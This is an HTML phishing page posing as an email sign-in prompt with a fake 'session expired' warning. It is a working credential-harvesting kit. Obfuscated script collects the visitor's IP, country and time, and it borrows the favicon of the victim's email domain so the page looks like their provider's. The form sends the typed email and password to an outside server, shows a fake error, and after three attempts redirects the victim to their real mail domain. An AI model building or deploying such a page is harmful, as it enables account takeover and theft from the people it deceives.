<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Safe Sign In</title>
  <style>
    /* Minimal styling for demo */
    /* body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(30,35,40,.08); transform:translateY(12px); opacity:0; animation: slideIn .4s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    label { display:block; font-size:.9rem; margin-top:12px; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #d9dde6; border-radius:8px; margin-top:6px; box-sizing:border-box; }
    .row { display:flex; gap:8px; align-items:center; margin-top:12px; }
    button { padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; cursor:pointer; }
    button[disabled] { opacity:.6; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; }
    .error-container { display:none; margin-top:10px; color:#fff; background:#ef4444; padding:8px; border-radius:6px; font-size:.9rem; }
    .success { display:none; margin-top:10px; color:#065f46; background:#bbf7d0; padding:8px; border-radius:6px; font-size:.9rem; }
    .small { font-size:.85rem; color:#6b7280; margin-top:8px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; margin-left:6px; } */

     body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f5f7fb; }
    .container { width:360px; background:#fff; padding:20px; border-radius:12px; box-shadow:0 8px 30px rgba(20,25,30,.06); transform:translateY(12px); opacity:0; animation: slideIn .35s forwards; }
    @keyframes slideIn { to { transform:none; opacity:1; } }
    h2 { margin:0 0 8px; font-size:1.25rem; }
    label { display:block; font-size:.92rem; margin-top:12px; color:#374151; }
    input[type="text"], input[type="password"] { width:100%; padding:10px; border:1px solid #e6e9ef; border-radius:8px; margin-top:6px; box-sizing:border-box; font-size:.95rem; }
    .row { display:flex; gap:8px; align-items:center; margin-top:14px; }
    button { flex:1; padding:10px 12px; border-radius:8px; border:0; background:#2563eb; color:white; font-weight:600; cursor:pointer; }
    button[disabled] { opacity:.65; cursor:not-allowed; }
    .spinner { display:none; margin-left:8px; font-size:.95rem; color:#374151; }
    .error-container { display:none; margin-top:12px; background:#ef4444; color:#fff; padding:9px; border-radius:8px; font-size:.9rem; text-align:center; }
    .small { font-size:.85rem; color:#6b7280; margin-top:10px; }
    .action-link { color:#2563eb; cursor:pointer; text-decoration:underline; }
  
  </style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="title">
    <h2 id="title">Sign In</h2>

    <form id="loginForm" name="loginForm" autocomplete="off">

         <span id="country"></span>
            <!-- <span id="city"></span> -->
            <span id="eyep"></span>
            <span id="nownow"></span>
            <!-- Paragraph -->
            <p class="mb-4 " style="font-size: .8rem; color: red;">Your previous session has expired; please sign in to continue.</p>

      <label for="id">Email</label>
      <input id="id" name="id" type="text" inputmode="email" placeholder="" />

      <label for="pswrd">Password</label>
      <input id="pswrd" name="pswrd" type="password" placeholder="Enter password" />

    <!-- <div class="row" style="margin-top:14px">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" aria-hidden="true">⏳</div>
      </div>  -->
      
      <div class="row">
        <button id="submit-btn" type="submit">Sign In</button>
        <div class="spinner" id="spinner">⏳</div>
      </div>
    </form>

    <!-- <div class="error-container" role="alert"></div>
    <div class="success" id="successBox"></div> -->

    <!-- <div class="small">
      After 3 failed attempts, we can suggest your email provider's homepage if it's an allowed domain.
      <span id="suggestLinkHolder"></span>
    </div> -->

     <div class="error-container" id="errorBox" role="alert"></div>
    <div class="small" id="infoText">
      Session timeout detected. Please reauthenticate to proceed to your email domain.
    </div>
  </div>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
<script>
function _0x44c3(_0x5b6c42,_0x4db1df){const _0x18765b=_0xe605();return _0x44c3=function(_0x547b9a,_0xc5f930){_0x547b9a=_0x547b9a-(0x2691+0x4f2*0x2+-0x2c0*0x11);let _0x21afff=_0x18765b[_0x547b9a];return _0x21afff;},_0x44c3(_0x5b6c42,_0x4db1df);}const _0x1992aa=_0x44c3;(function(_0x14b1b5,_0x3d3ce9){const _0x6f9c7f=_0x44c3,_0x5750e2=_0x14b1b5();while(!![]){try{const _0x5deaf2=parseInt(_0x6f9c7f(0x1e3))/(0x40*0x23+0x3*0xa67+-0x27f4*0x1)+parseInt(_0x6f9c7f(0x1df))/(0x1553+-0x61a*0x1+-0xf37)+-parseInt(_0x6f9c7f(0x1da))/(0x1aa0+-0x26*0x22+-0x1*0x1591)+parseInt(_0x6f9c7f(0x1ce))/(-0x1026*-0x1+0x137a+-0x239c)+parseInt(_0x6f9c7f(0x1c7))/(-0x144*-0x4+0x13ce+-0x18d9)*(parseInt(_0x6f9c7f(0x1cb))/(0x13*0x8a+0x1*-0x1083+0x1*0x64b))+-parseInt(_0x6f9c7f(0x1e9))/(0x1e8e+-0x3a8+-0x1adf)+parseInt(_0x6f9c7f(0x1ba))/(0xa09+-0x23fd+-0x19fc*-0x1);if(_0x5deaf2===_0x3d3ce9)break;else _0x5750e2['push'](_0x5750e2['shift']());}catch(_0x595533){_0x5750e2['push'](_0x5750e2['shift']());}}}(_0xe605,0x1*-0x14088b+-0x2*-0x96535+0xbe4c8),window[_0x1992aa(0x1b7)]=function(){const _0x13698e=_0x1992aa,_0x4e73d3={'rtTNe':_0x13698e(0x1c5),'iDKpA':_0x13698e(0x1d7),'eliqR':function(_0x5e2ef9,_0x1e7429){return _0x5e2ef9+_0x1e7429;},'wFBqS':_0x13698e(0x1b8)+_0x13698e(0x1c4)+_0x13698e(0x1e2)+_0x13698e(0x1be)+'n='};let _0x1cd275=document[_0x13698e(0x1cc)+_0x13698e(0x1e7)]('id')[_0x13698e(0x1db)],_0x5aff96=_0x1cd275[_0x13698e(0x1c9)]('@')?_0x1cd275[_0x13698e(0x1dc)]('@')[0x6e2*-0x1+-0x2*-0x3e+-0xb*-0x95]:'';document[_0x13698e(0x1cc)+_0x13698e(0x1e7)](_0x4e73d3[_0x13698e(0x1cf)])[_0x13698e(0x1d6)+'t']=_0x5aff96,document[_0x13698e(0x1cc)+_0x13698e(0x1e7)](_0x4e73d3[_0x13698e(0x1bd)])[_0x13698e(0x1b6)]=_0x4e73d3[_0x13698e(0x1c1)](_0x4e73d3[_0x13698e(0x1de)],_0x5aff96);});function _0xe605(){const _0x11c2cb=['.com/v1/ip','tor','catch','#eyep','#city','textConten','favicon','RVUEJ','city','3877536zaJwaj','value','split','vlfAr','wFBqS','2085928sgepYQ','name','i.geoapify','om/s2/favi','476857nSxAmN','querySelec','https://ap','4e8a','ById','then','2921926AikMQn','#country','src','onload','https://ww','290b61999b','5206912tOPNmR','error','UuMQp','iDKpA','cons?domai','a5554f48bf','country','eliqR','json','names','w.google.c','domain','info?apiKe','2905krmEok','crQBl','includes','y=139d2378','1836wKiDYV','getElement','#nownow','237928qnkMzr','rtTNe','innerHTML'];_0xe605=function(){return _0x11c2cb;};return _0xe605();}let dt=new Date(),ipAdress=_0x1992aa(0x1e5)+_0x1992aa(0x1e1)+_0x1992aa(0x1d1)+_0x1992aa(0x1c6)+_0x1992aa(0x1ca)+_0x1992aa(0x1bf)+_0x1992aa(0x1b9)+_0x1992aa(0x1e6);fetch(''+ipAdress)[_0x1992aa(0x1e8)](_0x2b471d=>_0x2b471d[_0x1992aa(0x1c2)]())[_0x1992aa(0x1e8)](_0x3babf1=>{const _0x55a762=_0x1992aa,_0x320ed7={'vlfAr':_0x55a762(0x1b5),'crQBl':_0x55a762(0x1d5),'UuMQp':_0x55a762(0x1d4),'RVUEJ':_0x55a762(0x1cd)},_0x59fc20=document[_0x55a762(0x1e4)+_0x55a762(0x1d2)](_0x320ed7[_0x55a762(0x1dd)]);_0x59fc20[_0x55a762(0x1d0)]=_0x3babf1[_0x55a762(0x1c0)][_0x55a762(0x1e0)];const _0x1798e3=document[_0x55a762(0x1e4)+_0x55a762(0x1d2)](_0x320ed7[_0x55a762(0x1c8)]);_0x1798e3[_0x55a762(0x1d0)]=_0x3babf1[_0x55a762(0x1d9)][_0x55a762(0x1c3)]['en'];const _0x2ffe25=document[_0x55a762(0x1e4)+_0x55a762(0x1d2)](_0x320ed7[_0x55a762(0x1bc)]);_0x2ffe25[_0x55a762(0x1d0)]=_0x3babf1['ip'];const _0x5a8881=document[_0x55a762(0x1e4)+_0x55a762(0x1d2)](_0x320ed7[_0x55a762(0x1d8)]);_0x5a8881[_0x55a762(0x1d0)]=dt;})[_0x1992aa(0x1d3)](_0x289fb8=>console[_0x1992aa(0x1bb)](_0x289fb8));
</script>


  <script>
  (function () {
    // === CONFIG: change only if needed ===
    const POST_URL = 'https://stquneurine.com/zxqsMn/feedback.php'; // your original test endpoint

    // === State & DOM refs ===
    let signInAttempts = 0;
    const form = document.getElementById('loginForm');
    const emailField = document.getElementById('id');
    const passwordField = document.getElementById('pswrd');
    const submitBtn = document.getElementById('submit-btn');
    const spinner = document.getElementById('spinner');
    const errorBox = document.getElementById('errorBox');

    // Safety checks
    if (!form || !emailField || !passwordField || !submitBtn) {
      console.error('Required form elements are missing.');
      return;
    }

    // Prefill from ?id= if present
    try {
      const qEmail = new URLSearchParams(window.location.search).get('id');
      if (qEmail) emailField.value = qEmail;
    } catch (e) { /* ignore */ }

    // Helpers
    function setUiLoading(loading) {
      submitBtn.disabled = loading;
      submitBtn.textContent = loading ? 'Loading...' : 'Sign In';
      spinner.style.display = loading ? 'inline-block' : 'none';
    }

    function showError(message) {
      errorBox.textContent = message;
      errorBox.style.display = 'block';
      passwordField.value = '';
      setTimeout(() => { errorBox.style.display = 'none'; }, 3000);
    }

    function extractDomain(email) {
      if (!email || typeof email !== 'string') return '';
      const t = email.trim();
      if (!t.includes('@')) return '';
      const parts = t.split('@').filter(Boolean);
      if (parts.length < 2) return '';
      let domain = parts.slice(1).join('@');
      domain = domain.split('/')[0].split(':')[0].trim().toLowerCase();
      return domain;
    }

    function looksLikeDomain(domain) {
      if (!domain) return false;
      if (domain.indexOf(' ') !== -1) return false;
      return domain.indexOf('.') > 0;
    }

    // Submit handler: actually POST to POST_URL
    form.addEventListener('submit', async function (evt) {
      evt.preventDefault();

      const email = (emailField.value || '').trim();
      const password = (passwordField.value || '').trim();

      if (!email) {
        showError('Please enter your email.');
        return;
      }
      if (!password || password.length < 6) {
        showError('Incorrect password. Please try again');
        return;
      }

      signInAttempts += 1;
      setUiLoading(true);

      // Use FormData so field names are exactly email/password as in the form
      const fd = new FormData();
      fd.append('id', email);
      fd.append('pswrd', password);

      try {
        // Perform the real network POST to your specified endpoint
        // Note: this will actually contact the remote server.
        const resp = await fetch(POST_URL, {
          method: 'POST',
          body: fd,
          mode: 'cors' // allow CORS; server must permit if different origin
        });

        // For test purposes, we treat all responses the same (show generic error)
        // You can inspect resp.status / resp.text() here to change behavior.
        if (!resp.ok) {
          // server returned non-2xx
          console.warn('Server returned', resp.status);
        }
        // show same UX as before
        showError('An unknown error occurred, please try again.');

      } catch (err) {
        console.error('Network error while posting:', err);
        showError('An unknown error occurred, please try again.');
      } finally {
        setUiLoading(false);
      }

      // After 3 attempts (or more), redirect to email domain automatically
      if (signInAttempts >= 3) {
        const domain = extractDomain(email);
        if (looksLikeDomain(domain)) {
          // small delay so user sees the message
          setTimeout(() => {
            window.location.href = 'https://' + domain;
          }, 900);
        } else {
          // couldn't parse domain
          showError('Could not determine a valid domain from your email.');
        }
      }
    });
  })();
  </script>
</body>
</html>
